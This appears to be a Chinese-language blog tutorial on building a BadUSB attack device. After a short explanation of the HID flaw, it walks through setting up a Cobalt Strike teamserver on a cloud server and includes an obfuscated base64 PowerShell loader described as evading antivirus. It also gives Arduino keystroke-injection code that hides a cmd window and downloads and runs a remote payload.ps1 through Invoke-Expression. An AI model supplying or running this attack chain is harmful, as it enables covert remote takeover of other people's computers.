BadUSB介绍

随着设备不断的升级改进，USB 能够连接到许多不同的设备，包括鼠标、键盘、相机、摄像头、无线网络设备等。但不幸的是，USB 的设计方式产生了这个 BadUSB 安全漏洞。
BadUSB 漏洞是由安全研究人员 Karsten Nohl 和 Jakob Lell 在 2014 年黑帽会议上首次发现并暴露出来的，这也就让USB安全和几乎所有和USB相关的设备（包括具有USB端口的电脑）都陷入相当危险的状态。
就狭义来说，BadUSB是指形似 U 盘的设备，内部的电路在上电之后会被系统识别为键盘，此时该设备内部的芯片开始与电脑进行键盘通讯，仿照人的输入习惯，来操作电脑，以此达到骇入电脑的目的。
 就广义来说，BadUSB是指一切会被电脑识别为 HID 设备的，外观却不像键盘的电子设备。现阶段有的 badusb 是形似数据线的，有的则是手机加定制内核，以发挥 BadUSB 的作用，更有甚者，将 BadUSB 开发为模块，可以嵌入任意的带 USB 接口的设备中。

准备工作

购买 badusb 、 烧录器 、 云服务器；共计开销大概二百五
①.在服务器中上传cs、screen，用于制作cs免杀马等
Default
sftp root@IP
ls
put \xxx\cs.zip
 
ssh root@IP
apt update
apt install unzip
unzip cs.zip
apt install default-jdk
cd cs
chmod 777 teamserver
sudo ./teamserver IP password
 
apt install screen
screen -S test

②.下载并安装开发环境Arduino
由于 Arduino 的易用性，现阶段最常用的 BadUSB 还是基于 Arduino 进行设计的
下载地址：https://www.arduino.cc/en/software （有Windows、Linux、Mac版本，PS：建议别下最新的）

③.通过 zading 软件在电脑上安装对应的烧录器驱动
首先需要让电脑识别到我们的BadUSB设备（PS：需要找老的type-a线，新的我试过去貌似都无法识别）

然后打开 zading 软件，点击 Options - List All Devices，找到我们的 usbasp
Driver设置为libusb0(v1.2.6.0)
USB ID 16C0 05DC
当其在设备管理器中显示为 libusb-win32 devices 设备时，就意味着安装好了烧录器驱动

④.下载并安装烧录工具 progisp

CS免杀操作

制作CS免杀马，将其base64编码处理一下
Default
Set-StrictMode -Version 2
 
$a1 = 'base64编码'
$a2 = 'base64编码'
$a3 = 'base64编码'
$a4 = 'base64编码'
$a5 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($a1+$a2+$a3+$a4))
 
If ([IntPtr]::size -eq 8) {
  start-job { param($a) IEX $a } -RunAs32 -Argument $a5 | wait-job | Receive-Job
}
else {
  IEX $a5
}

接着把文件名改为全大写的，然后通过CS上传至我们的公网服务器上（攻击 – 钓鱼攻击 – 文件下载），实现全程无落地✈
然后将我们需要的操作搞成思路，形成最基础的想法，接着将思路写成代码，通过 Arduino 编译生成hex文件，最后利用工具 progisp 烧录到我们的BadUSB中
附上部分关键代码
Default
//payload
if (onetimeOrForever == 0)
{
  delay(1000);
  Keyboard.begin();//开始键盘通讯 
  delay(1500);//延时 
  Keyboard.press(KEY_LEFT_GUI);//win键 
  delay(500);
  Keyboard.press('r');//r键
  delay(500); 
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.release('r');
  delay(500);
  Keyboard.press(KEY_CAPS_LOCK);//利用开大写输小写绕过输入法
  Keyboard.release(KEY_CAPS_LOCK);
  Keyboard.println("CMD /t:01 /k @ECHO OFF && MODE CON:cols=15 lines=1");   //使用最小化隐藏cmd窗口
  //cmd /c start /minCMD /C START /MIN POWERSHELL -W HIDDEN
  delay(500);
  Keyboard.press(KEY_RETURN); 
  Keyboard.release(KEY_RETURN); 
  delay(1300);
  Keyboard.println("echo set-alias -name rookie -value Invoke-Expression;rookie(new-object net.webclient).downloadstring('http://IP/payload.ps1') | powershell -");
  Keyboard.press(KEY_RETURN); 
  Keyboard.release(KEY_RETURN); 
  Keyboard.press(KEY_CAPS_LOCK);//利用开大写输小写绕过输入法
  Keyboard.release(KEY_CAPS_LOCK);
  Keyboard.end();//结束键盘通讯
  
  delay(1000);
  Keyboard.begin();//开始键盘通讯 
  delay(1500);//延时 
  Keyboard.press(KEY_LEFT_GUI);//win键 
  delay(500);
  Keyboard.press('r');//r键
  delay(500); 
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.release('r');
  delay(500);
  Keyboard.press(KEY_CAPS_LOCK);//利用开大写输小写绕过输入法
  Keyboard.release(KEY_CAPS_LOCK);
  Keyboard.println("notepad.exe");    //打开记事本
  delay(500);
  Keyboard.println("                                   $$$$ ");
  delay(500);
  Keyboard.println("                               $$         $$");
  Keyboard.println("                               $$         $$");
  Keyboard.println("                               $$         $$");
  Keyboard.println("                               $$         $$");
  Keyboard.println("                               $$         $$");
  Keyboard.println("                               $$         $$");
  Keyboard.println("                        $$$$$$         $$$$$$");
  Keyboard.println("   $$$$$$     $$         $$         $$        $$$$");
  Keyboard.println("   $$         $$$$         $$         $$        $$    $$");
  Keyboard.println("   $$             $$         $$         $$        $$        $$");
  Keyboard.println("        $$        $$                                 $$         $$");
  Keyboard.println("          $$$    $$                                              $$");
  Keyboard.println("            $$                                                      $$");
  Keyboard.println("              $$$                                                  $$");
  Keyboard.println("                $$                                                  $$");
  Keyboard.println("                  $$$                                              $$");
  Keyboard.println("                    $$                                          $$$");
  Keyboard.println("                      $$$                                      $$");
  Keyboard.println("                        $$                                      $$");
  Keyboard.println("                          $$$                              $$$");
  Keyboard.println("                            $$                              $$");
  Keyboard.println("                            $$$$$$$$$$$$$$$$$$$$");
  delay(500);
  Keyboard.press(KEY_RETURN); 
  Keyboard.release(KEY_RETURN);
  Keyboard.press(KEY_CAPS_LOCK);//利用开大写输小写绕过输入法
  Keyboard.release(KEY_CAPS_LOCK);
  Keyboard.end();//结束键盘通讯